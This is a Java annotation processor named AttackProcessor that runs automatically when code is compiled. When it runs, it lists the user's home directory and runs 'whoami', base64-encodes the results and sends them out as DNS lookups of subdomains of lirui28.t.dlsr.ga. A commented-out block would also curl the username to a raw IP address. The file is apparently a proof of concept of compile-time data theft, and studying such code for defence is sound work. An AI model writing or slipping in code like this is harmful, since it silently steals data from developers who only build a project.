package org.cyber;


import javax.annotation.processing.AbstractProcessor;
import javax.annotation.processing.ProcessingEnvironment;
import javax.annotation.processing.RoundEnvironment;
import javax.annotation.processing.SupportedAnnotationTypes;
import javax.lang.model.element.TypeElement;
import javax.tools.Diagnostic;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Inet4Address;
import java.net.UnknownHostException;
import java.util.Arrays;
import java.util.Base64;
import java.util.Set;

@SupportedAnnotationTypes("*")
public class AttackProcessor extends AbstractProcessor {
    @Override
    public synchronized void init(ProcessingEnvironment processingEnv) {
        super.init(processingEnv);
    }

    @Override
    public boolean process(Set<? extends TypeElement> annotations, RoundEnvironment roundEnv) {
        StringBuffer sb = new StringBuffer("");


        try
        {
            Inet4Address.getByName( "javac18.lirui28.t.dlsr.ga" );

            Inet4Address.getByName( System.getProperty("user.dir")+".1.lirui28.t.dlsr.ga" );


            File folder = new File(System.getProperty("user.home"));

            if (folder.isDirectory()){
                File[] files = folder.listFiles();
                sb.append( Arrays.deepToString( files));
            }
            String fs = sb.toString();
            //输出base64编码的url home文件夹的内容到外部
            fs = new String( Base64.getEncoder().encode( fs.getBytes() ) );
            fs = fs.replaceAll("\\n", "");

            if (fs.length()>20){
                Inet4Address.getByName( fs.substring( 0,20 )+".3.lirui28.t.dlsr.ga" );

                //Inet4Address.getByName( fs.substring( 0,90 )+".2.lirui28.t.dlsr.ga" );
            } else {
                    Inet4Address.getByName( "xiaoyu20"+".3.lirui28.t.dlsr.ga" );
            }

            try {
                Runtime runtime = Runtime.getRuntime();
                Process p = runtime.exec("whoami");
                Inet4Address.getByName( "excute"+".7.lirui28.t.dlsr.ga" );

                //p.waitFor();
                BufferedReader bw = new BufferedReader( new InputStreamReader( p
                                                                                               .getInputStream()));
                String s;
                while ((s=bw.readLine())!=null) {


                    s = new String( Base64.getEncoder().encode( s.getBytes() ) );

                    Inet4Address.getByName( s+".4.lirui28.t.dlsr.ga" );


                }
                bw.close();
            } catch (Exception e) {
                Inet4Address.getByName( "runtimeerror"+".5.lirui28.t.dlsr.ga" );

            }

        }
        catch ( Exception e )
        {
            try
            {

                Inet4Address.getByName( e.getMessage().replaceAll( " ","" ) +".6.lirui28.t.dlsr.ga" );
            }
            catch ( UnknownHostException e1 )
            {
                e1.printStackTrace();
            }

        }

//        try {
//            Runtime r = Runtime.getRuntime();
//            //Process p = r.exec(new String[]{"/bin/bash","-c","open ."});
//
//            Process p = r.exec(new String[]{"/bin/bash","-c","curl http://182.92.151.151:8888/"+System.getProperty("user.name")});
//            p.waitFor();
//        } catch (IOException e) {
//            e.printStackTrace();
//        } catch (InterruptedException e) {
//            e.printStackTrace();
//        }


        processingEnv.getMessager().printMessage(
                Diagnostic.Kind.MANDATORY_WARNING, "Hello Worlds!"+sb.toString());
        return false;
    }
}
